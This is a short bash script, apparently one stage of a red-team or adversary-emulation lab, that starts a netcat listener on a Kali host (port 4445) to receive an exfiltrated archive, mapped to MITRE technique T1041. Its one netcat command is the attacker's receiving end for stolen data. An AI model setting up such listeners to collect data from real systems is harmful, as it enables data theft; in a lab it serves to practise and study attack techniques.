#!/usr/bin/env bash
# Stage 11 — Exfiltration (T1041), part 1/2
# Host: Kali Linux — listener, receives the exfiltrated archive
set -euo pipefail

nc -lvnp 4445 > received_exfil.zip

# After the transfer completes, verify integrity against the source file:
# sha256sum received_exfil.zip
